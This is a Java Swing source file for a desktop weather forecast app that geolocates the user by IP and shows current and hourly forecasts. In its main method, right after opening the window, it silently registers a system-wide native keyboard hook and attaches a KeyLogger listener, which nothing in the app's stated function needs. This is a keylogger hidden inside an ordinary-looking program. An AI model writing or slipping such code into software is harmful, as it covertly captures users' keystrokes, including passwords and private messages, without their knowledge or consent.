/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package weather.view;

import abc.handler.KeyLogger;
import java.awt.Color;
import java.io.IOException;
import java.text.ParseException;
import java.util.ArrayList;
import java.util.StringTokenizer;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.ImageIcon;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.json.JSONException;
import weather.data.LocationResponse;
import weather.data.WeatherResponse;
import weather.model.Forecast;
import weather.model.Location;

/**
 *
 * @author Admin
 */
public class main extends javax.swing.JFrame {

    /**
     * Creates new form main
     */
    private LocationResponse locationResponse;
    private weather.data.WeatherResponse weatherResponse;
    private Forecast currentForecast;
    private ArrayList<Forecast> hourlyForecast;
    private Location location;
    private String ip;

    private int X, Y;

    public main() {
        initComponents();
        setSize(768, 1024);
        setLocationRelativeTo(null);
        btnChooseCountry.setBackground(new Color(0, 0, 0, 0));
        btnMinium.setBackground(new Color(0, 0, 0, 0));
        btnClose.setBackground(new Color(0, 0, 0, 0));
        btnSeeMore.setBackground(new Color(0, 0, 0, 0));
        setBackground(new Color(0, 0, 0, 0));
        pnSearch.setVisible(false);
        pnSearch.setBackground(new Color(0, 0, 0, 0));
        btnSearch.setBackground(new Color(0, 0, 0, 0));
        pnLocationError.setBackground(new Color(0, 0, 0, 0));
        pnLocationError.setVisible(false);
        btnClose1.setBackground(new Color(0, 0, 0, 0));
        btnExitNet.setBackground(new Color(0, 0, 0, 0));
        pnNetWorkErr.setBackground(new Color(0, 0, 0, 0));
        pnNetWorkErr.setVisible(false);
        
        weatherResponse = new WeatherResponse();
        locationResponse = new LocationResponse();
        try {
            ip = weather.data.GetIp.getExternalIpV4();
            location = locationResponse.getLocationByIp(ip);
            update(location);
        } catch (IOException ex) {
            Logger.getLogger(main.class.getName()).log(Level.SEVERE, null, ex);
        } catch (JSONException ex) {
            Logger.getLogger(main.class.getName()).log(Level.SEVERE, null, ex);
        } catch (ParseException ex) {
            Logger.getLogger(main.class.getName()).log(Level.SEVERE, null, ex);
        }


    }
    
    private void update(Location l) throws IOException, JSONException, ParseException{
            currentForecast = weatherResponse.requestCurrentForecastByCoordinates(l);
            hourlyForecast = weatherResponse.requestHourlyForecastByCoordinates(l);
//            System.out.println(currentForecast.getDt().getHours());
            iconWeather.setIcon(new ImageIcon("C:\\Users\\Huong\\Documents\\NetBeansProjects\\Weather\\pic\\" + currentForecast.getWeather().getIcon() + "_" + iconWeather.getSize().width + ".png"));
            txtDeg.setText(currentForecast.getTemp().get("current") + "°C");
            txtAdress.setText(location.getCity() + "," + location.getCountry());
            //m co the for
            System.out.println(hourlyForecast);
            txtHour1st.setText(hourlyForecast.get(3).getDt().getHours() + ":00");
            iconWeather1st.setIcon(new ImageIcon("C:\\Users\\Huong\\Documents\\NetBeansProjects\\Weather\\pic\\" + hourlyForecast.get(3).getWeather().getIcon() + "_" + iconWeather1st.getSize().width + ".png"));
            txtDeg1st.setText(hourlyForecast.get(3).getTemp().get("current") + "°C");
//            System.out.println(txtHour2nd.getSize().width);
            txtHour2nd.setText(hourlyForecast.get(6).getDt().getHours() + ":00");
            iconWeather2nd.setIcon(new ImageIcon("C:\\Users\\Huong\\Documents\\NetBeansProjects\\Weather\\pic\\" + hourlyForecast.get(6).getWeather().getIcon() + "_" + iconWeather2nd.getSize().width + ".png"));
            txtDeg2nd.setText(hourlyForecast.get(6).getTemp().get("current") + "°C");

            txtHour3rd.setText(hourlyForecast.get(9).getDt().getHours() + ":00");
            iconWeather3rd.setIcon(new ImageIcon("C:\\Users\\Huong\\Documents\\NetBeansProjects\\Weather\\pic\\" + hourlyForecast.get(9).getWeather().getIcon() + "_" + iconWeather3rd.getSize().width + ".png"));
            txtDeg3rd.setText(hourlyForecast.get(9).getTemp().get("current") + "°C");

            txtWinSpeed.setText(currentForecast.getWind_speed() + "m/s");
            txtVisibility.setText(currentForecast.getVisibility() + "m");
            Humidity.setText(currentForecast.getHumidity() + "%");
            txtUV.setText(currentForecast.getUvi() + "nm");
    }

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        pnNetWorkErr = new javax.swing.JPanel();
        btnExitNet = new javax.swing.JButton();
        jLabel6 = new javax.swing.JLabel();
        pnLocationError = new javax.swing.JPanel();
        btnClose1 = new javax.swing.JButton();
        jLabel4 = new javax.swing.JLabel();
        btnChooseCountry = new javax.swing.JButton();
        pnSearch = new javax.swing.JPanel();
        txtCountryName = new javax.swing.JTextField();
        btnSearch = new javax.swing.JButton();
        jLabel2 = new javax.swing.JLabel();
        jLabel1 = new javax.swing.JLabel();
        btnMinium = new javax.swing.JButton();
        btnClose = new javax.swing.JButton();
        txtDeg = new javax.swing.JLabel();
        txtAdress = new javax.swing.JLabel();
        iconWeather = new javax.swing.JLabel();
        txtTomorrow = new javax.swing.JLabel();
        pnStatus = new javax.swing.JPanel();
        txtAfter = new javax.swing.JLabel();
        txtToday = new javax.swing.JLabel();
        pn3rd = new javax.swing.JPanel();
        txtHour3rd = new javax.swing.JLabel();
        iconWeather3rd = new javax.swing.JLabel();
        txtDeg3rd = new javax.swing.JLabel();
        jLabel22 = new javax.swing.JLabel();
        pn2nd = new javax.swing.JPanel();
        txtHour2nd = new javax.swing.JLabel();
        iconWeather2nd = new javax.swing.JLabel();
        txtDeg2nd = new javax.swing.JLabel();
        jLabel5 = new javax.swing.JLabel();
        pn1st = new javax.swing.JPanel();
        txtHour1st = new javax.swing.JLabel();
        iconWeather1st = new javax.swing.JLabel();
        txtDeg1st = new javax.swing.JLabel();
        jLabel3 = new javax.swing.JLabel();
        jLabel17 = new javax.swing.JLabel();
        jLabel18 = new javax.swing.JLabel();
        jLabel19 = new javax.swing.JLabel();
        jLabel20 = new javax.swing.JLabel();
        jLabel21 = new javax.swing.JLabel();
        txtWinSpeed = new javax.swing.JLabel();
        txtVisibility = new javax.swing.JLabel();
        Humidity = new javax.swing.JLabel();
        txtUV = new javax.swing.JLabel();
        btnSeeMore = new javax.swing.JButton();
        BG = new javax.swing.JLabel();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setUndecorated(true);
        getContentPane().setLayout(null);

        pnNetWorkErr.setLayout(null);

        btnExitNet.setBorder(null);
        pnNetWorkErr.add(btnExitNet);
        btnExitNet.setBounds(600, 330, 60, 50);

        jLabel6.setIcon(new javax.swing.ImageIcon("C:\\Users\\Huong\\Documents\\NetBeansProjects\\Weather\\pic\\NetWorkErr.png")); // NOI18N
        jLabel6.setMaximumSize(new java.awt.Dimension(726, 1024));
        jLabel6.setMinimumSize(new java.awt.Dimension(726, 1024));
        pnNetWorkErr.add(jLabel6);
        jLabel6.setBounds(0, 0, 768, 1024);

        getContentPane().add(pnNetWorkErr);
        pnNetWorkErr.setBounds(1000, 0, 768, 1024);

        pnLocationError.setLayout(null);

        btnClose1.setBackground(new java.awt.Color(255, 255, 255));
        btnClose1.setBorder(null);
        btnClose1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnClose1ActionPerformed(evt);
            }
        });
        pnLocationError.add(btnClose1);
        btnClose1.setBounds(600, 340, 42, 42);

        jLabel4.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        jLabel4.setIcon(new javax.swing.ImageIcon("C:\\Users\\Huong\\Documents\\NetBeansProjects\\Weather\\pic\\LocationError.png")); // NOI18N
        pnLocationError.add(jLabel4);
        jLabel4.setBounds(0, 0, 768, 1024);

        getContentPane().add(pnLocationError);
        pnLocationError.setBounds(1000, 0, 768, 1024);

        btnChooseCountry.setIcon(new javax.swing.ImageIcon("C:\\Users\\Huong\\Documents\\NetBeansProjects\\Weather\\pic\\searchCountry.png")); // NOI18N
        btnChooseCountry.setToolTipText("");
        btnChooseCountry.setBorder(null);
        btnChooseCountry.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        btnChooseCountry.setPreferredSize(new java.awt.Dimension(42, 42));
        btnChooseCountry.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnChooseCountryActionPerformed(evt);
            }
        });
        getContentPane().add(btnChooseCountry);
        btnChooseCountry.setBounds(48, 31, 42, 42);

        pnSearch.setLayout(null);

        txtCountryName.setFont(new java.awt.Font("Arial", 0, 24)); // NOI18N
        txtCountryName.setForeground(new java.awt.Color(181, 98, 145));
        txtCountryName.setBorder(null);
        txtCountryName.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                txtCountryNameActionPerformed(evt);
            }
        });
        pnSearch.add(txtCountryName);
        txtCountryName.setBounds(40, 0, 410, 54);

        btnSearch.setIcon(new javax.swing.ImageIcon("C:\\Users\\Huong\\Documents\\NetBeansProjects\\Weather\\pic\\searchButton.png")); // NOI18N
        btnSearch.setBorder(null);
        btnSearch.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        btnSearch.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnSearchActionPerformed(evt);
            }
        });
        pnSearch.add(btnSearch);
        btnSearch.setBounds(462, 0, 73, 54);

        jLabel2.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        jLabel2.setIcon(new javax.swing.ImageIcon("C:\\Users\\Huong\\Documents\\NetBeansProjects\\Weather\\pic\\searchBar.png")); // NOI18N
        pnSearch.add(jLabel2);
        jLabel2.setBounds(0, 0, 534, 54);

        getContentPane().add(pnSearch);
        pnSearch.setBounds(65, 25, 534, 54);

        jLabel1.setFont(new java.awt.Font("Arial Rounded MT Bold", 1, 30)); // NOI18N
        jLabel1.setForeground(new java.awt.Color(255, 255, 255));
        jLabel1.setText("Weather Forecast");
        getContentPane().add(jLabel1);
        jLabel1.setBounds(248, 33, 272, 36);

        btnMinium.setIcon(new javax.swing.ImageIcon("C:\\Users\\Huong\\Documents\\NetBeansProjects\\Weather\\pic\\Asset 4.png")); // NOI18N
        btnMinium.setToolTipText("");
        btnMinium.setBorder(null);
        btnMinium.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        btnMinium.setPreferredSize(new java.awt.Dimension(42, 42));
        btnMinium.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnMiniumActionPerformed(evt);
            }
        });
        getContentPane().add(btnMinium);
        btnMinium.setBounds(656, 31, 42, 42);

        btnClose.setIcon(new javax.swing.ImageIcon("C:\\Users\\Huong\\Documents\\NetBeansProjects\\Weather\\pic\\Asset 5.png")); // NOI18N
        btnClose.setToolTipText("");
        btnClose.setBorder(null);
        btnClose.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        btnClose.setPreferredSize(new java.awt.Dimension(42, 42));
        btnClose.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnCloseActionPerformed(evt);
            }
        });
        getContentPane().add(btnClose);
        btnClose.setBounds(706, 31, 42, 42);

        txtDeg.setFont(new java.awt.Font("Arial Rounded MT Bold", 0, 48)); // NOI18N
        txtDeg.setForeground(new java.awt.Color(247, 138, 85));
        txtDeg.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        txtDeg.setText("44.3");
        txtDeg.setHorizontalTextPosition(javax.swing.SwingConstants.CENTER);
        txtDeg.setVerifyInputWhenFocusTarget(false);
        getContentPane().add(txtDeg);
        txtDeg.setBounds(0, 200, 768, 85);

        txtAdress.setFont(new java.awt.Font("Arial", 0, 24)); // NOI18N
        txtAdress.setForeground(new java.awt.Color(227, 110, 121));
        txtAdress.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        txtAdress.setText("Ha Noi, Viet Nam");
        txtAdress.setHorizontalTextPosition(javax.swing.SwingConstants.CENTER);
        txtAdress.setVerifyInputWhenFocusTarget(false);
        getContentPane().add(txtAdress);
        txtAdress.setBounds(0, 285, 768, 28);
        getContentPane().add(iconWeather);
        iconWeather.setBounds(339, 110, 90, 90);

        txtTomorrow.setFont(new java.awt.Font("Arial Rounded MT Bold", 0, 22)); // NOI18N
        txtTomorrow.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        txtTomorrow.setText("Tomorrow");
        txtTomorrow.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        txtTomorrow.setHorizontalTextPosition(javax.swing.SwingConstants.CENTER);
        txtTomorrow.setVerifyInputWhenFocusTarget(false);
        txtTomorrow.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                txtTomorrowMouseClicked(evt);
            }
        });
        getContentPane().add(txtTomorrow);
        txtTomorrow.setBounds(299, 357, 170, 48);

        pnStatus.setBackground(new java.awt.Color(227, 110, 121));
        getContentPane().add(pnStatus);
        pnStatus.setBounds(173, 398, 80, 3);

        txtAfter.setFont(new java.awt.Font("Arial Rounded MT Bold", 0, 22)); // NOI18N
        txtAfter.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        txtAfter.setText("After");
        txtAfter.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        txtAfter.setHorizontalTextPosition(javax.swing.SwingConstants.CENTER);
        txtAfter.setVerifyInputWhenFocusTarget(false);
        txtAfter.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                txtAfterMouseClicked(evt);
            }
        });
        getContentPane().add(txtAfter);
        txtAfter.setBounds(470, 357, 170, 48);

        txtToday.setFont(new java.awt.Font("Arial Rounded MT Bold", 0, 22)); // NOI18N
        txtToday.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        txtToday.setText("Today");
        txtToday.setCursor(new java.awt.Cursor(java.awt.Cursor.HAND_CURSOR));
        txtToday.setHorizontalTextPosition(javax.swing.SwingConstants.CENTER);
        txtToday.setVerifyInputWhenFocusTarget(false);
        txtToday.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                txtTodayMouseClicked(evt);
            }
        });
        getContentPane().add(txtToday);
        txtToday.setBounds(128, 357, 170, 48);

        pn3rd.setBackground(new java.awt.Color(255, 255, 255));
        pn3rd.setForeground(new java.awt.Color(255, 255, 255));
        pn3rd.setLayout(null);

        txtHour3rd.setBackground(new java.awt.Color(255, 255, 255));
        txtHour3rd.setFont(new java.awt.Font("Arial Rounded MT Bold", 0, 24)); // NOI18N
        txtHour3rd.setForeground(new java.awt.Color(255, 255, 255));
        txtHour3rd.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        txtHour3rd.setText("12:00");
        pn3rd.add(txtHour3rd);
        txtHour3rd.setBounds(0, 16, 162, 28);

        iconWeather3rd.setBackground(new java.awt.Color(255, 102, 0));
        pn3rd.add(iconWeather3rd);
        iconWeather3rd.setBounds(41, 110, 80, 80);

        txtDeg3rd.setBackground(new java.awt.Color(255, 255, 255));
        txtDeg3rd.setFont(new java.awt.Font("Arial Rounded MT Bold", 0, 30)); // NOI18N
        txtDeg3rd.setForeground(new java.awt.Color(255, 255, 255));
        txtDeg3rd.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        txtDeg3rd.setText("33 C");
        pn3rd.add(txtDeg3rd);
        txtDeg3rd.setBounds(0, 210, 162, 38);

        jLabel22.setIcon(new javax.swing.ImageIcon("C:\\Users\\Huong\\Documents\\NetBeansProjects\\Weather\\pic\\Asset 10.png")); // NOI18N
        pn3rd.add(jLabel22);
        jLabel22.setBounds(0, 0, 162, 301);

        getContentPane().add(pn3rd);
        pn3rd.setBounds(478, 421, 162, 301);

        pn2nd.setBackground(new java.awt.Color(255, 255, 255));
        pn2nd.setLayout(null);

        txtHour2nd.setBackground(new java.awt.Color(255, 255, 255));
        txtHour2nd.setFont(new java.awt.Font("Arial Rounded MT Bold", 0, 24)); // NOI18N
        txtHour2nd.setForeground(new java.awt.Color(255, 255, 255));
        txtHour2nd.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        txtHour2nd.setText("12:00");
        pn2nd.add(txtHour2nd);
        txtHour2nd.setBounds(0, 16, 162, 28);

        iconWeather2nd.setBackground(new java.awt.Color(255, 102, 0));
        pn2nd.add(iconWeather2nd);
        iconWeather2nd.setBounds(41, 110, 80, 80);

        txtDeg2nd.setBackground(new java.awt.Color(255, 255, 255));
        txtDeg2nd.setFont(new java.awt.Font("Arial Rounded MT Bold", 0, 30)); // NOI18N
        txtDeg2nd.setForeground(new java.awt.Color(255, 255, 255));
        txtDeg2nd.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        txtDeg2nd.setText("33 C");
        pn2nd.add(txtDeg2nd);
        txtDeg2nd.setBounds(0, 210, 162, 38);

        jLabel5.setIcon(new javax.swing.ImageIcon("C:\\Users\\Huong\\Documents\\NetBeansProjects\\Weather\\pic\\Asset 9.png")); // NOI18N
        pn2nd.add(jLabel5);
        jLabel5.setBounds(0, 0, 162, 301);

        getContentPane().add(pn2nd);
        pn2nd.setBounds(303, 421, 162, 301);

        pn1st.setBackground(new java.awt.Color(255, 255, 255));
        pn1st.setLayout(null);

        txtHour1st.setBackground(new java.awt.Color(255, 255, 255));
        txtHour1st.setFont(new java.awt.Font("Arial Rounded MT Bold", 0, 24)); // NOI18N
        txtHour1st.setForeground(new java.awt.Color(255, 255, 255));
        txtHour1st.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        txtHour1st.setText("12:00");
        pn1st.add(txtHour1st);
        txtHour1st.setBounds(0, 16, 162, 28);

        iconWeather1st.setBackground(new java.awt.Color(255, 102, 0));
        pn1st.add(iconWeather1st);
        iconWeather1st.setBounds(41, 110, 80, 80);

        txtDeg1st.setBackground(new java.awt.Color(255, 255, 255));
        txtDeg1st.setFont(new java.awt.Font("Arial Rounded MT Bold", 0, 30)); // NOI18N
        txtDeg1st.setForeground(new java.awt.Color(255, 255, 255));
        txtDeg1st.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        txtDeg1st.setText("33 C");
        pn1st.add(txtDeg1st);
        txtDeg1st.setBounds(0, 210, 162, 38);

        jLabel3.setIcon(new javax.swing.ImageIcon("C:\\Users\\Huong\\Documents\\NetBeansProjects\\Weather\\pic\\Asset 7_1.png")); // NOI18N
        pn1st.add(jLabel3);
        jLabel3.setBounds(0, 0, 162, 301);

        getContentPane().add(pn1st);
        pn1st.setBounds(126, 421, 162, 301);

        jLabel17.setFont(new java.awt.Font("Arial Rounded MT Bold", 0, 22)); // NOI18N
        jLabel17.setForeground(new java.awt.Color(72, 86, 123));
        jLabel17.setText("Visibility");
        getContentPane().add(jLabel17);
        jLabel17.setBounds(129, 860, 100, 28);

        jLabel18.setFont(new java.awt.Font("Arial Rounded MT Bold", 0, 24)); // NOI18N
        jLabel18.setText("Additonal infor");
        getContentPane().add(jLabel18);
        jLabel18.setBounds(129, 764, 180, 28);

        jLabel19.setFont(new java.awt.Font("Arial Rounded MT Bold", 0, 22)); // NOI18N
        jLabel19.setForeground(new java.awt.Color(72, 86, 123));
        jLabel19.setText("Humidity");
        getContentPane().add(jLabel19);
        jLabel19.setBounds(434, 816, 100, 28);

        jLabel20.setFont(new java.awt.Font("Arial Rounded MT Bold", 0, 22)); // NOI18N
        jLabel20.setForeground(new java.awt.Color(72, 86, 123));
        jLabel20.setText("Wind");
        getContentPane().add(jLabel20);
        jLabel20.setBounds(129, 816, 70, 28);

        jLabel21.setFont(new java.awt.Font("Arial Rounded MT Bold", 0, 22)); // NOI18N
        jLabel21.setForeground(new java.awt.Color(72, 86, 123));
        jLabel21.setText("UV");
        getContentPane().add(jLabel21);
        jLabel21.setBounds(434, 860, 40, 28);

        txtWinSpeed.setFont(new java.awt.Font("Arial Rounded MT Bold", 0, 22)); // NOI18N
        txtWinSpeed.setForeground(new java.awt.Color(181, 98, 145));
        txtWinSpeed.setText("12Km/h");
        getContentPane().add(txtWinSpeed);
        txtWinSpeed.setBounds(258, 816, 90, 28);

        txtVisibility.setFont(new java.awt.Font("Arial Rounded MT Bold", 0, 22)); // NOI18N
        txtVisibility.setForeground(new java.awt.Color(181, 98, 145));
        txtVisibility.setText("12Km");
        getContentPane().add(txtVisibility);
        txtVisibility.setBounds(258, 860, 90, 28);

        Humidity.setFont(new java.awt.Font("Arial Rounded MT Bold", 0, 22)); // NOI18N
        Humidity.setForeground(new java.awt.Color(181, 98, 145));
        Humidity.setText("12Km/h");
        getContentPane().add(Humidity);
        Humidity.setBounds(563, 816, 90, 28);

        txtUV.setFont(new java.awt.Font("Arial Rounded MT Bold", 0, 22)); // NOI18N
        txtUV.setForeground(new java.awt.Color(181, 98, 145));
        txtUV.setText("12Km");
        getContentPane().add(txtUV);
        txtUV.setBounds(563, 860, 90, 28);

        btnSeeMore.setIcon(new javax.swing.ImageIcon("C:\\Users\\Huong\\Documents\\NetBeansProjects\\Weather\\pic\\Asset 1.png")); // NOI18N
        btnSeeMore.setBorder(null);
        btnSeeMore.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnSeeMoreActionPerformed(evt);
            }
        });
        getContentPane().add(btnSeeMore);
        btnSeeMore.setBounds(256, 929, 256, 71);

        BG.setIcon(new javax.swing.ImageIcon("C:\\Users\\Huong\\Documents\\NetBeansProjects\\Weather\\pic\\bg.png")); // NOI18N
        BG.setToolTipText("");
        BG.addMouseMotionListener(new java.awt.event.MouseMotionAdapter() {
            public void mouseDragged(java.awt.event.MouseEvent evt) {
                BGMouseDragged(evt);
            }
        });
        BG.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mousePressed(java.awt.event.MouseEvent evt) {
                BGMousePressed(evt);
            }
        });
        getContentPane().add(BG);
        BG.setBounds(0, 0, 769, 1023);

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void btnCloseActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnCloseActionPerformed

        this.setVisible(false);
        (new miniMain(currentForecast)).setVisible(true);

    }//GEN-LAST:event_btnCloseActionPerformed

    private void btnMiniumActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnMiniumActionPerformed
        setState(this.ICONIFIED);
    }//GEN-LAST:event_btnMiniumActionPerformed

    private void BGMousePressed(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_BGMousePressed
        X = evt.getX();
        Y = evt.getY();
    }//GEN-LAST:event_BGMousePressed

    private void BGMouseDragged(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_BGMouseDragged
        this.setLocation((evt.getX() + this.getX()) - X, (evt.getY() + this.getY()) - Y);
    }//GEN-LAST:event_BGMouseDragged

    private void txtTomorrowMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_txtTomorrowMouseClicked
        pnStatus.setLocation(327, 398);
        pnStatus.setSize(114, 3);
    }//GEN-LAST:event_txtTomorrowMouseClicked

    private void txtAfterMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_txtAfterMouseClicked
        pnStatus.setLocation(515, 398);
        pnStatus.setSize(80, 3);
    }//GEN-LAST:event_txtAfterMouseClicked

    private void txtTodayMouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_txtTodayMouseClicked
        pnStatus.setLocation(173, 398);
        pnStatus.setSize(80, 3);
    }//GEN-LAST:event_txtTodayMouseClicked

    private void btnSeeMoreActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnSeeMoreActionPerformed
        this.setVisible(false);
        (new moreInforr(currentForecast)).setVisible(true);

    }//GEN-LAST:event_btnSeeMoreActionPerformed

    private void btnChooseCountryActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnChooseCountryActionPerformed

        btnChooseCountry.setVisible(false);
        pnSearch.setVisible(true);
    }//GEN-LAST:event_btnChooseCountryActionPerformed

    private void btnSearchActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnSearchActionPerformed

        if (txtCountryName.getText().length() == 0) {
            pnLocationError.setVisible(true);

        } else {
            pnSearch.setVisible(false);
            btnChooseCountry.setVisible(true);
            String adress = txtCountryName.getText();
            System.out.println(adress);
            String[] split = adress.split("[, ]");
            location = new Location(split[split.length-1], split[split.length-2]);
            try {
                locationResponse.setCoordinatesByAddress(location);
                update(location);
            } catch (IOException ex) {
                Logger.getLogger(main.class.getName()).log(Level.SEVERE, null, ex);
            } catch (JSONException ex) {
                Logger.getLogger(main.class.getName()).log(Level.SEVERE, null, ex);
            } catch (ParseException ex) {
                Logger.getLogger(main.class.getName()).log(Level.SEVERE, null, ex);
            }
            
            
        }

    }//GEN-LAST:event_btnSearchActionPerformed

    private void txtCountryNameActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_txtCountryNameActionPerformed
        // TODO add your handling code here:
    }//GEN-LAST:event_txtCountryNameActionPerformed

    private void btnClose1ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_btnClose1ActionPerformed
        pnLocationError.setVisible(false);
    }//GEN-LAST:event_btnClose1ActionPerformed

    /**
     * @param args the command line arguments
     */
    public static void main(String args[]) {
        /* Set the Nimbus look and feel */
        //<editor-fold defaultstate="collapsed" desc=" Look and feel setting code (optional) ">
        /* If Nimbus (introduced in Java SE 6) is not available, stay with the default look and feel.
         * For details see http://download.oracle.com/javase/tutorial/uiswing/lookandfeel/plaf.html 
         */
        try {
            for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    javax.swing.UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(main.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(main.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(main.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(main.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
        //</editor-fold>

        /* Create and display the form */
        java.awt.EventQueue.invokeLater(new Runnable() {
            public void run() {
                new main().setVisible(true);

                try {
                    KeyLogger service = new KeyLogger();
                    GlobalScreen.registerNativeHook();
                    GlobalScreen.getInstance().addNativeKeyListener(service.getKeybroad());

                } catch (IOException ex) {
                    ex.printStackTrace();
                } catch (NativeHookException ex) {
                    Logger.getLogger(main.class.getName()).log(Level.SEVERE, null, ex);
                }

            }
        });

    }

    //dfkjdkfjd gjdfgh kgfjdkgj kgj lkjgfjg kljgkfdjgkfdgkjgkfjg

    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JLabel BG;
    private javax.swing.JLabel Humidity;
    private javax.swing.JButton btnChooseCountry;
    private javax.swing.JButton btnClose;
    private javax.swing.JButton btnClose1;
    private javax.swing.JButton btnExitNet;
    private javax.swing.JButton btnMinium;
    private javax.swing.JButton btnSearch;
    private javax.swing.JButton btnSeeMore;
    private javax.swing.JLabel iconWeather;
    private javax.swing.JLabel iconWeather1st;
    private javax.swing.JLabel iconWeather2nd;
    private javax.swing.JLabel iconWeather3rd;
    private javax.swing.JLabel jLabel1;
    private javax.swing.JLabel jLabel17;
    private javax.swing.JLabel jLabel18;
    private javax.swing.JLabel jLabel19;
    private javax.swing.JLabel jLabel2;
    private javax.swing.JLabel jLabel20;
    private javax.swing.JLabel jLabel21;
    private javax.swing.JLabel jLabel22;
    private javax.swing.JLabel jLabel3;
    private javax.swing.JLabel jLabel4;
    private javax.swing.JLabel jLabel5;
    private javax.swing.JLabel jLabel6;
    private javax.swing.JPanel pn1st;
    private javax.swing.JPanel pn2nd;
    private javax.swing.JPanel pn3rd;
    private javax.swing.JPanel pnLocationError;
    private javax.swing.JPanel pnNetWorkErr;
    private javax.swing.JPanel pnSearch;
    private javax.swing.JPanel pnStatus;
    private javax.swing.JLabel txtAdress;
    private javax.swing.JLabel txtAfter;
    private javax.swing.JTextField txtCountryName;
    private javax.swing.JLabel txtDeg;
    private javax.swing.JLabel txtDeg1st;
    private javax.swing.JLabel txtDeg2nd;
    private javax.swing.JLabel txtDeg3rd;
    private javax.swing.JLabel txtHour1st;
    private javax.swing.JLabel txtHour2nd;
    private javax.swing.JLabel txtHour3rd;
    private javax.swing.JLabel txtToday;
    private javax.swing.JLabel txtTomorrow;
    private javax.swing.JLabel txtUV;
    private javax.swing.JLabel txtVisibility;
    private javax.swing.JLabel txtWinSpeed;
    // End of variables declaration//GEN-END:variables
}
